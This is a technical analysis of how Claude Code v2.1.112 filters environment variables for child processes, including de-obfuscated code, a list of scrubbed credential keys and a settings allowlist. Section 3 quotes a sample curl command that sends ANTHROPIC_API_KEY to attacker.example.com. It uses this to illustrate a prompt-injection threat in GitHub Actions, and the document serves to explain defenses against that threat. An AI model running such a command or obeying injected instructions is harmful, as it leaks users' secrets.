# Environment Variable Capture and Filtering (Claude Code 2.1.112)

> Subprocess env construction: how `subprocessEnv()` produces the env for every spawned child process — Bash tool, shell snapshot creation, MCP stdio servers, LSP servers, and shell hooks. Plus the settings-sourced env merge logic that handles SSH-tunnel, host-managed-provider, and CCD spawn-key protections.

Source: `chunks.78.mjs` (lines 754-940 — subprocess env scrub), `chunks.144.mjs` (provider env overrides + spawn). v2.1.88 readable counterparts: `src/utils/subprocessEnv.ts`, `src/utils/managedEnv.ts`, `src/utils/managedEnvConstants.ts`.

---

## Related Symbols

> Symbol mappings:
> - [symbol_additions_unit_08.md](../00_overview/symbol_additions_unit_08.md) - Unit 8 mappings
> - [symbol_index_infra_platform.md](../00_overview/symbol_index_infra_platform.md) - Platform infra

Key functions in this document:
- `subprocessEnv` (`Dk`) - Returns scrubbed env for child processes - chunks.78.mjs:876
- `isScrubEnabled` (`xP`) - Reads `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB` - chunks.78.mjs:754
- `shouldScrubSubprocessEnv` (`Kn_`) - Scrub + local-agent default - chunks.78.mjs:759
- `getUpstreamProxyEnv` (`TL8`) - Returns proxy env when registered - chunks.78.mjs:872
- `registerUpstreamProxyEnvFn` (`An_`) - Lazy registration from init.ts - chunks.78.mjs:868
- `provider.getEnvironmentOverrides` (`iPK`) - Per-command env overlay - chunks.144.mjs:2197
- `GHA_SUBPROCESS_SCRUB` (`Yn_`) - Env keys to strip - chunks.78.mjs:940

---

## 1. The Three-Layer Env Model

Every subprocess spawn merges three independent sources of env vars:

```
                                ┌──────────────────────────────────┐
                                │  Source 1: subprocessEnv() (Dk)  │
                                │  ─────────────────────────────   │
                                │  ...process.env                  │
                                │  + proxy vars (CCR only)         │
                                │  - GHA secrets (if scrub mode)   │
                                └──────────────────────────────────┘
                                                  │
                                                  v
                                ┌──────────────────────────────────┐
                                │  Source 2: Fixed keys            │
                                │  ─────────────────────────────   │
                                │  SHELL = bash path               │
                                │  GIT_EDITOR = "true"             │
                                │  CLAUDECODE = "1"                │
                                └──────────────────────────────────┘
                                                  │
                                                  v
                                ┌──────────────────────────────────┐
                                │  Source 3: providerOverrides     │
                                │  ─────────────────────────────   │
                                │  CLAUDE_CODE_EXECPATH = node bin │
                                │  TMUX = socket reattach          │
                                │  TMPDIR/CLAUDE_CODE_TMPDIR (sbx) │
                                │  TMPPREFIX (zsh, sbx)            │
                                │  sessionEnvVars (per-tool-call)  │
                                └──────────────────────────────────┘
                                                  │
                                                  v
                                ┌──────────────────────────────────┐
                                │  Source 4: OTEL TRACEPARENT      │
                                │  ─────────────────────────────   │
                                │  Conditional: only if active     │
                                └──────────────────────────────────┘
                                                  │
                                                  v
                                          spawn(..., { env })
```

Later sources override earlier ones (`{...a, ...b}` semantics). So provider overrides can replace `SHELL` if needed, and the fixed `CLAUDECODE = "1"` always wins over any inherited `process.env.CLAUDECODE`.

---

## 2. subprocessEnv: Scrubbed Parent Env

```javascript
// ============================================
// subprocessEnv - Returns process.env with secrets stripped (when scrub enabled)
// Location: chunks.78.mjs:876-888
// ============================================

// ORIGINAL (for source lookup):
function Dk() {
    let q = TL8(),
        K = Object.keys(q).length > 0,
        _ = Kn_();
    if (!K && !_ && !0) return process.env;
    let Y = {
        ...process.env,
        ...q
    };
    if (!_) return Y;
    for (let A of Yn_) delete Y[A], delete Y[`INPUT_${A}`];
    return Y
}

// READABLE (for understanding):
function subprocessEnv() {
  const proxyEnv = getUpstreamProxyEnv();                       // {} unless CCR
  const hasProxyEnv = Object.keys(proxyEnv).length > 0;
  const shouldScrub = shouldScrubSubprocessEnv();
  // Fast path: no proxy, no scrub - return process.env reference directly
  if (!hasProxyEnv && !shouldScrub) {
    return process.env;
  }
  // Build merged env: parent env + proxy overrides
  const env = { ...process.env, ...proxyEnv };
  if (!shouldScrub) return env;
  // Strip secrets and their GitHub Actions INPUT_ duplicates
  for (const key of GHA_SUBPROCESS_SCRUB) {
    delete env[key];
    delete env[`INPUT_${key}`];
  }
  return env;
}

// Mapping: Dk->subprocessEnv, TL8->getUpstreamProxyEnv, q->proxyEnv,
//   K->hasProxyEnv, _->shouldScrub, Kn_->shouldScrubSubprocessEnv,
//   Yn_->GHA_SUBPROCESS_SCRUB, A->key, Y->env
```

**Three return paths:**

| Condition | Return | Why |
|-----------|--------|-----|
| No proxy, no scrub | `process.env` direct reference | Hot path: no allocation, no copy |
| Proxy but no scrub | New object: `{...process.env, ...proxyEnv}` | Allows proxy injection without scrubbing |
| Scrub enabled (with or without proxy) | New object with secrets deleted | Full scrub path |

**Why the fast-path returns the live reference:**

`process.env` is a special proxy in Node.js — assigning to it modifies the real process env. Returning the proxy directly means subsequent writes during snapshot creation (e.g., a snapshot that exports a new variable) propagate back to the parent. The author chose this performance optimization knowing the parent process never relies on env stability after subprocess spawn — it's safe because `Object.assign` only reads from the source.

---

## 3. GHA Subprocess Scrub List

```javascript
// ============================================
// GHA_SUBPROCESS_SCRUB - Env keys stripped when scrub-mode is active
// Location: chunks.78.mjs:940
// ============================================

// ORIGINAL (for source lookup):
Yn_ = ["ANTHROPIC_API_KEY", "CLAUDE_CODE_OAUTH_TOKEN", "ANTHROPIC_AUTH_TOKEN",
       "ANTHROPIC_FOUNDRY_API_KEY", "ANTHROPIC_AWS_API_KEY",
       "ANTHROPIC_BEDROCK_MANTLE_API_KEY", "ANTHROPIC_CUSTOM_HEADERS",
       "OTEL_EXPORTER_OTLP_HEADERS", "OTEL_EXPORTER_OTLP_LOGS_HEADERS",
       "OTEL_EXPORTER_OTLP_METRICS_HEADERS", "OTEL_EXPORTER_OTLP_TRACES_HEADERS",
       "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN", "AWS_BEARER_TOKEN_BEDROCK",
       "GOOGLE_APPLICATION_CREDENTIALS", "AZURE_CLIENT_SECRET",
       "AZURE_CLIENT_CERTIFICATE_PATH", "ACTIONS_ID_TOKEN_REQUEST_TOKEN",
       "ACTIONS_ID_TOKEN_REQUEST_URL", "ACTIONS_RUNTIME_TOKEN",
       "ACTIONS_RUNTIME_URL", "ALL_INPUTS", "OVERRIDE_GITHUB_TOKEN",
       "DEFAULT_WORKFLOW_TOKEN", "SSH_SIGNING_KEY"]

// READABLE (groups by purpose):
const GHA_SUBPROCESS_SCRUB = [
  // Anthropic auth — parent process re-reads per request, subprocesses never need them
  "ANTHROPIC_API_KEY", "CLAUDE_CODE_OAUTH_TOKEN", "ANTHROPIC_AUTH_TOKEN",
  "ANTHROPIC_FOUNDRY_API_KEY", "ANTHROPIC_AWS_API_KEY",
  "ANTHROPIC_BEDROCK_MANTLE_API_KEY", "ANTHROPIC_CUSTOM_HEADERS",

  // OTLP exporter headers — documented to carry Authorization=Bearer tokens
  "OTEL_EXPORTER_OTLP_HEADERS", "OTEL_EXPORTER_OTLP_LOGS_HEADERS",
  "OTEL_EXPORTER_OTLP_METRICS_HEADERS", "OTEL_EXPORTER_OTLP_TRACES_HEADERS",

  // Cloud provider creds — SDKs read these lazily, subprocesses don't need them
  "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN", "AWS_BEARER_TOKEN_BEDROCK",
  "GOOGLE_APPLICATION_CREDENTIALS", "AZURE_CLIENT_SECRET",
  "AZURE_CLIENT_CERTIFICATE_PATH",

  // GitHub Actions OIDC — leaking allows minting an App installation token
  "ACTIONS_ID_TOKEN_REQUEST_TOKEN", "ACTIONS_ID_TOKEN_REQUEST_URL",

  // GitHub Actions artifact/cache API — cache poisoning -> supply-chain pivot
  "ACTIONS_RUNTIME_TOKEN", "ACTIONS_RUNTIME_URL",

  // claude-code-action-specific duplicates — action JS consumes these before spawning claude
  "ALL_INPUTS",          // contains anthropic_api_key as JSON
  "OVERRIDE_GITHUB_TOKEN",
  "DEFAULT_WORKFLOW_TOKEN",
  "SSH_SIGNING_KEY",
];

// Mapping: Yn_->GHA_SUBPROCESS_SCRUB
```

**The threat model this defends against:**

Inside a GitHub Actions workflow, model output can be exfiltrated by tricking Claude into running a Bash tool command like:

```
curl https://attacker.example.com/?key=$ANTHROPIC_API_KEY
```

If `ANTHROPIC_API_KEY` is inherited into the Bash tool's shell, the attacker gets it. Scrubbing the env before spawn means even if a prompt-injection succeeds, the secret isn't there to leak.

**What's NOT scrubbed:**

- `GITHUB_TOKEN` / `GH_TOKEN` — needed by wrapper scripts (gh.sh) to call the GitHub API. Tokens are job-scoped and expire when the workflow ends.
- Standard env (`PATH`, `HOME`, `USER`, etc.) — needed for the shell to work.
- `INPUT_FOO` env vars — only the `INPUT_<scrub-key>` duplicates are removed.

---

## 4. Scrub-Enable Logic

```javascript
// ============================================
// isScrubEnabled / shouldScrubSubprocessEnv - Scrub-mode resolution
// Location: chunks.78.mjs:754-763
// ============================================

// ORIGINAL (for source lookup):
function xP() {
    if (GL8 === void 0) GL8 = S6(process.env.CLAUDE_CODE_SUBPROCESS_ENV_SCRUB);
    return GL8
}
function Kn_() {
    if (xP()) return !0;
    if (c5(process.env.CLAUDE_CODE_SUBPROCESS_ENV_SCRUB)) return !1;
    return process.env.CLAUDE_CODE_ENTRYPOINT === "local-agent"
}

// READABLE (for understanding):
function isScrubEnabled() {
  // Cache CLAUDE_CODE_SUBPROCESS_ENV_SCRUB at first read
  if (cachedScrubFlag === undefined) {
    cachedScrubFlag = parseExplicitTrue(process.env.CLAUDE_CODE_SUBPROCESS_ENV_SCRUB);
  }
  return cachedScrubFlag;
}

function shouldScrubSubprocessEnv() {
  // Explicit truthy: scrub
  if (isScrubEnabled()) return true;
  // Explicit falsy: don't scrub
  if (parseExplicitFalse(process.env.CLAUDE_CODE_SUBPROCESS_ENV_SCRUB)) return false;
  // Implicit: scrub if running as a local-agent (subagent entrypoint)
  return process.env.CLAUDE_CODE_ENTRYPOINT === "local-agent";
}

// Mapping: xP->isScrubEnabled, Kn_->shouldScrubSubprocessEnv,
//   GL8->cachedScrubFlag, S6->parseExplicitTrue, c5->parseExplicitFalse
```

**Three states for `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB`:**

| Value | `isScrubEnabled` | `shouldScrubSubprocessEnv` |
|-------|---------------------|----------------------|
| `1` / `true` / `yes` | true | true |
| `0` / `false` / `no` | false | false |
| Unset | false | true if `CLAUDE_CODE_ENTRYPOINT === "local-agent"`, else false |

**Why two different functions:**

- `isScrubEnabled` is the *fast path predicate* used in many places (e.g., to gate the bwrap mountpoint setup). Caching makes it cheap to call repeatedly.
- `shouldScrubSubprocessEnv` is the *full resolution* with the local-agent default. This is what `subprocessEnv()` actually consults.

The local-agent default exists because subagents spawned by Claude itself run user-supplied tasks where prompt injection is more likely (the parent agent might have read a malicious file). Defaulting to scrub here is safer than requiring the user to remember to set the flag.

---

## 5. Upstream Proxy Env (CCR Sessions)

```javascript
// ============================================
// registerUpstreamProxyEnvFn / getUpstreamProxyEnv - Lazy proxy env hook
// Location: chunks.78.mjs:868-874
// ============================================

// ORIGINAL (for source lookup):
function An_(q) {
    UH4 = q
}
function TL8() {
    return UH4?.() ?? {}
}

// READABLE (for understanding):
let upstreamProxyEnvFn;            // module-level variable (UH4)
function registerUpstreamProxyEnvFn(fn) {
  upstreamProxyEnvFn = fn;
}
function getUpstreamProxyEnv() {
  return upstreamProxyEnvFn?.() ?? {};
}

// Mapping: An_->registerUpstreamProxyEnvFn, TL8->getUpstreamProxyEnv, UH4->upstreamProxyEnvFn
```

**Why dynamic registration:**

The upstreamproxy module (which manages the CCR HTTP relay) is heavy — it includes a TLS terminator, an HTTPS connection pool, and a request mirroring stack. Loading it for non-CCR sessions wastes memory.

The pattern is:
1. `subprocessEnv.ts` declares `_getUpstreamProxyEnv` as `undefined`.
2. `init.ts` checks if CCR mode is active; if yes, it dynamically imports the upstreamproxy module.
3. After import, the upstreamproxy module calls `registerUpstreamProxyEnvFn(fn)` to wire in its env-vending function.
4. From then on, `subprocessEnv()` includes the proxy-related env vars (`HTTPS_PROXY`, CA bundle path, etc.) in every subprocess spawn.

**Why this matters for Bash tool integration:**

CCR sessions use a local HTTP relay to inspect or transform Claude API traffic. If a Bash tool command invokes `curl`, `gh`, or `python -m anthropic`, those subprocesses must route through the relay too — otherwise they bypass the inspection layer. The proxy env vars (`HTTPS_PROXY=http://127.0.0.1:54321`, `SSL_CERT_FILE=/path/to/relay-ca.crt`) achieve this transparently.

For non-CCR sessions, `upstreamProxyEnvFn` stays `undefined` and `getUpstreamProxyEnv()` returns `{}` — no overhead at all.

---

## 6. Per-Command Env Overrides (Provider Layer)

```javascript
// ============================================
// getEnvironmentOverrides - Per-Bash-tool-call env overlay
// Location: chunks.144.mjs:2197-2210
// ============================================

// ORIGINAL (for source lookup):
async getEnvironmentOverrides(A, O, w) {
    let $ = A.includes("tmux"),
        j = w?.getTmuxEnv() ?? null,
        H = {};
    if (H[d47] = process.execPath, j) H.TMUX = j;
    if (O)
        for (let [J, X] of O) H[J] = X;
    if (_) {
        let J = _;
        if (y1() === "windows") J = sX(J);
        H.TMPDIR = J, H.CLAUDE_CODE_TMPDIR = J, H.TMPPREFIX = cU8(J, "zsh")
    }
    return H
}

// READABLE (for understanding):
async function getEnvironmentOverrides(command, sessionEnvVars, tmuxSocket) {
  // Note: $ (commandUsesTmux) is computed but unused — vestigial from an earlier
  // version that gated TMUX injection on whether the command mentioned tmux.
  // Current logic injects TMUX unconditionally when a socket was captured.
  void command.includes("tmux");
  const tmuxValue = tmuxSocket?.getTmuxEnv() ?? null;
  const overrides = {};

  // Always: hint subprocesses where the parent claude binary lives
  overrides[CLAUDE_CODE_EXECPATH] = process.execPath;

  // Tmux reattach: only set TMUX if we captured a socket at startup
  if (tmuxValue) overrides.TMUX = tmuxValue;

  // Session env vars (per-tool-call overrides from the caller)
  if (sessionEnvVars) {
    for (const [key, value] of sessionEnvVars) {
      overrides[key] = value;
    }
  }

  // Sandbox temp directory: redirect all temp files
  if (sandboxTmpDir) {     // captured from buildExecCommand
    let sandboxPath = sandboxTmpDir;
    if (getPlatform() === "windows") sandboxPath = posixPathToWindowsPath(sandboxPath);
    overrides.TMPDIR = sandboxPath;
    overrides.CLAUDE_CODE_TMPDIR = sandboxPath;
    overrides.TMPPREFIX = pathJoinPosix(sandboxPath, "zsh");
  }
  return overrides;
}

// Mapping: A->command, O->sessionEnvVars, w->tmuxSocket,
//   $->(unused) commandUsesTmux, j->tmuxValue, H->overrides,
//   d47->CLAUDE_CODE_EXECPATH, _->sandboxTmpDir, J->sandboxPath,
//   y1->getPlatform, sX->posixPathToWindowsPath, cU8->pathJoinPosix
```

**Five potential overrides:**

| Key | When set | Why |
|-----|----------|-----|
| `CLAUDE_CODE_EXECPATH` | Always | Lets subprocesses find the running claude binary (used by SDK scripts, status-line helpers) |
| `TMUX` | When tmux socket was captured at startup | Allows `tmux send-keys` etc. to work inside Claude Code's shell |
| `<custom>` | When `sessionEnvVars` is non-empty | Per-call overrides — used by session-env hook system for scratch variables |
| `TMPDIR` | Sandbox active | Isolates temp files to the sandbox tmpdir |
| `CLAUDE_CODE_TMPDIR` | Sandbox active | Same as TMPDIR but Claude-specific (used by Claude-aware tools) |
| `TMPPREFIX` | Sandbox active | Zsh temp file prefix — different from TMPDIR in zsh |

**Why `sessionEnvVars` is a `Map` not an object:**

The caller (Bash tool input handler) builds session env vars from multiple sources (session start hooks, file-changed hooks). Using a `Map` preserves insertion order, which matters when two hooks set the same key — last-write-wins.

**Why no `SHELL` override here:**

`SHELL` is set in the spawn call (after these overrides), at a higher precedence. Setting it here would be overwritten anyway, so the function leaves it alone.

---

## 7. Snapshot-Creation Env (Special Case)

The shell snapshot is created via `execFile` (not `spawn`), but uses the same scrubbed env:

```javascript
// chunks.144.mjs:2011-2020 (excerpt)
n_Y(q, ["-c", "-l", j], {
    env: {
        ...process.env.CLAUDE_CODE_DONT_INHERIT_ENV ? {} : Dk(),
        SHELL: q,
        GIT_EDITOR: "true",
        CLAUDECODE: "1"
    },
    timeout: g47,
    maxBuffer: 1048576,
    encoding: "utf8"
}, /* callback */)
```

**Two differences from regular Bash tool spawn:**

1. `CLAUDE_CODE_DONT_INHERIT_ENV` — if set, the snapshot shell gets a completely empty env (no inheritance, no `subprocessEnv()`). Useful for users who want absolutely deterministic snapshots regardless of their interactive shell env. Note: this only affects snapshot creation, not later Bash tool calls.

2. No `providerOverrides`, no OTEL — snapshot creation predates provider construction, so it can't depend on its own state.

This means the snapshot script itself runs with scrubbed secrets too. Even if a user's `.bashrc` exports `ANTHROPIC_API_KEY="..."` (as some setups do), the snapshot won't see it during creation (when scrub mode is on), so the snapshot file won't contain the secret to be re-sourced later.

---

## 8. Settings-Sourced Env (managedEnv.ts)

In addition to `subprocessEnv()`, there is a separate layer in v2.1.88's `managedEnv.ts` that applies env vars from settings files (`~/.claude/settings.json`, etc.) to `process.env` at startup. The v2.1.112 obfuscated equivalent is in a different module — the logic lives near `chunks.78.mjs`'s `wp1` (`setupSubprocessScrub`) and surrounding helpers.

From the v2.1.88 source:

```typescript
// src/utils/managedEnv.ts:124-178 - applySafeConfigEnvironmentVariables
export function applySafeConfigEnvironmentVariables(): void {
  // Capture CCD spawn-env keys once (only in CCD mode)
  if (ccdSpawnEnvKeys === undefined) {
    ccdSpawnEnvKeys = process.env.CLAUDE_CODE_ENTRYPOINT === "claude-desktop"
      ? new Set(Object.keys(process.env))
      : null;
  }

  // Apply ALL global config env, filtered by:
  //   - withoutSSHTunnelVars (strip ANTHROPIC_* when ANTHROPIC_UNIX_SOCKET set)
  //   - withoutHostManagedProviderVars (strip provider routing when host-managed)
  //   - withoutCcdSpawnEnvKeys (strip keys the desktop host set)
  Object.assign(process.env, filterSettingsEnv(getGlobalConfig().env));

  // Apply ALL env from trusted sources (userSettings, flagSettings) - same filter
  for (const source of ["userSettings", "flagSettings"]) {
    if (!isSettingSourceEnabled(source)) continue;
    Object.assign(process.env, filterSettingsEnv(getSettingsForSource(source)?.env));
  }
  isRemoteManagedSettingsEligible();   // compute eligibility now
  Object.assign(process.env, filterSettingsEnv(getSettingsForSource("policySettings")?.env));

  // Apply only SAFE_ENV_VARS from project-scoped sources
  const settingsEnv = filterSettingsEnv(getSettings_DEPRECATED()?.env);
  for (const [key, value] of Object.entries(settingsEnv)) {
    if (SAFE_ENV_VARS.has(key.toUpperCase())) {
      process.env[key] = value;
    }
  }
}
```

This **mutates** `process.env` at startup — so by the time `subprocessEnv()` runs, the settings-sourced env is already in `process.env` and gets inherited (or scrubbed) like any other env var.

**Three filter passes (each handles a different threat):**

| Filter | Removes when | Threat |
|--------|--------------|--------|
| `withoutSSHTunnelVars` | `ANTHROPIC_UNIX_SOCKET` set | `claude ssh` remote: settings.env must not override the launcher's auth-tunnel placeholders |
| `withoutHostManagedProviderVars` | `CLAUDE_CODE_PROVIDER_MANAGED_BY_HOST=1` | Host owns inference routing; settings.env must not redirect provider/auth/model defaults |
| `withoutCcdSpawnEnvKeys` | `CLAUDE_CODE_ENTRYPOINT === "claude-desktop"` | CCD mode: settings.env must not override OTEL/etc. keys the desktop host set to orchestrate the subprocess (e.g., `OTEL_LOGS_EXPORTER=console` would corrupt the stdio JSON-RPC transport) |

**Two-pass merge (trusted then safe):**

1. **Trusted sources** (`userSettings`, `flagSettings`, `policySettings`): ALL env vars applied, even dangerous ones like `ANTHROPIC_BASE_URL`. Trusted means user-owned or admin-controlled, so the user already explicitly chose what to allow.
2. **All sources merged** (including project-scoped `projectSettings` and `localSettings`): only `SAFE_ENV_VARS` (allowlist) applied. This is what runs after the trust dialog; project-scoped sources can only set env vars from the safe-list, so a malicious `.claude/settings.json` committed by an attacker cannot redirect API traffic.

---

## 9. SAFE_ENV_VARS Allowlist Summary

The `SAFE_ENV_VARS` set in `managedEnvConstants.ts` lists env vars that can be set from project-scoped settings. Categories:

- **Model defaults** — `ANTHROPIC_MODEL`, `ANTHROPIC_SMALL_FAST_MODEL`, all the `ANTHROPIC_DEFAULT_<TIER>_MODEL_*` variants
- **Provider selection** — `CLAUDE_CODE_USE_BEDROCK`, `CLAUDE_CODE_USE_VERTEX`, `CLAUDE_CODE_USE_FOUNDRY`
- **AWS/Vertex region overrides** — `AWS_REGION`, `AWS_PROFILE`, `VERTEX_REGION_CLAUDE_<MODEL>`
- **Bash tool tunables** — `BASH_DEFAULT_TIMEOUT_MS`, `BASH_MAX_OUTPUT_LENGTH`, `BASH_MAX_TIMEOUT_MS`
- **Disables/toggles** — `DISABLE_AUTOUPDATER`, `DISABLE_TELEMETRY`, etc.
- **MCP tunables** — `MCP_TIMEOUT`, `MAX_MCP_OUTPUT_TOKENS`
- **OTEL configuration** — protocols, intervals, resource attributes (but NOT endpoints or headers — those route to an attacker server, so they're dangerous)

**What's deliberately NOT in the allowlist** (and thus blocked from project-scoped settings):

- `ANTHROPIC_BASE_URL` — would redirect API calls to an attacker server
- `HTTP_PROXY` / `HTTPS_PROXY` — same threat
- `OTEL_EXPORTER_OTLP_ENDPOINT` — would redirect telemetry/secrets to an attacker server
- `NODE_TLS_REJECT_UNAUTHORIZED` — would trust an attacker's TLS cert
- `NODE_EXTRA_CA_CERTS` — would trust an attacker's CA bundle
- `ANTHROPIC_API_KEY` / `ANTHROPIC_AUTH_TOKEN` — would let project settings switch to an attacker's account

---

## 10. The Complete Env Plumbing

```
┌────────────────────────────────────────────────────────────────────────┐
│  Startup (init.ts)                                                     │
│  ─────────────────                                                     │
│  1. applySafeConfigEnvironmentVariables()                              │
│       Filters settings.env through 3 filters, applies to process.env   │
│       - userSettings, flagSettings, policySettings: ALL keys           │
│       - merged sources: only SAFE_ENV_VARS                             │
│  2. CCR mode? -> dynamic import upstreamproxy                          │
│       upstreamproxy calls registerUpstreamProxyEnvFn(fn)               │
│                                                                         │
│  process.env is now ready                                              │
│                                                                         │
└────────────────────────────────────────────────────────────────────────┘
                                  │
                                  v
┌────────────────────────────────────────────────────────────────────────┐
│  Every subprocess spawn                                                │
│  ──────────────────────                                                │
│  env: {                                                                │
│    ...subprocessEnv(),     ← copy of process.env + proxy - GHA scrubs  │
│    SHELL: bash binary,                                                 │
│    GIT_EDITOR: "true",                                                 │
│    CLAUDECODE: "1",                                                    │
│    ...providerOverrides,   ← CLAUDE_CODE_EXECPATH, TMUX, TMPDIR, etc.  │
│    ...(otel ? { TRACEPARENT: ... } : {})                               │
│  }                                                                     │
└────────────────────────────────────────────────────────────────────────┘
```

The model can introspect what env it sees by running `env` as a Bash tool command — but secrets stripped at the spawn boundary are simply not there. This is the same approach used by container runtimes: defense at the boundary, not inside the container.

---

## 11. v2.1.112 Behavior Changes vs v2.1.76

| Behavior | v2.1.76 | v2.1.112 | Why |
|----------|---------|----------|-----|
| Subprocess env scrub | Not yet implemented | `Dk()` introduced | GHA prompt-injection hardening |
| `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB` | Not present | Read at startup | Opt-in scrubbing |
| local-agent default scrub | N/A | Auto-enabled when `CLAUDE_CODE_ENTRYPOINT === "local-agent"` | Subagents see untrusted content more often |
| Upstream proxy env injection | Not present | Lazy via `An_` registration | CCR sessions transparently route subprocesses |
| `CLAUDE_CODE_EXECPATH` override | Not set | Always set | Subprocesses can locate the parent claude binary |
| `withoutCcdSpawnEnvKeys` filter | Not present | Captures CCD spawn env, prevents overrides | Prevents settings.env from corrupting CCD JSON-RPC transport |
| `withoutHostManagedProviderVars` | Not present | Filters provider-routing keys when `CLAUDE_CODE_PROVIDER_MANAGED_BY_HOST` | Prevents settings.env from redirecting host-managed inference |
| `BUN_OPTIONS=--smol` injection | Not present | Added if `CLAUDE_CODE_REMOTE` is set (via `command_assembly.md`) | Memory hardening for remote sessions |

---

## Summary

Subprocess env capture and filtering in Claude Code v2.1.112 is a defense-in-depth system:

1. **Startup scrub** — settings-sourced env is filtered by SSH-tunnel, host-provider, and CCD filters before being merged into `process.env`. Project-scoped sources only get a safe-allowlist.
2. **Per-spawn scrub** — `subprocessEnv()` strips GHA secrets from every child process env, even though they remain in `process.env` for the parent. Opt-in via `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB`, auto-on for `local-agent` entrypoint.
3. **Proxy injection** — CCR sessions inject `HTTPS_PROXY`/CA-bundle vars into every subprocess so curl/gh/python route through the local relay. Lazy-loaded so non-CCR sessions pay nothing.
4. **Provider overlay** — per-Bash-tool-call overrides for tmux reattach, sandbox tmpdir, and caller-supplied session env vars.

Each layer addresses a different threat, and each layer can be disabled independently for trusted environments. The composition is order-sensitive: settings filters at startup, scrub at spawn time, overlay last — meaning provider overrides always win, but startup-applied settings env (even allowlisted ones) can still be scrubbed if they happen to be in `GHA_SUBPROCESS_SCRUB` (none currently overlap, but the design is robust to future additions).
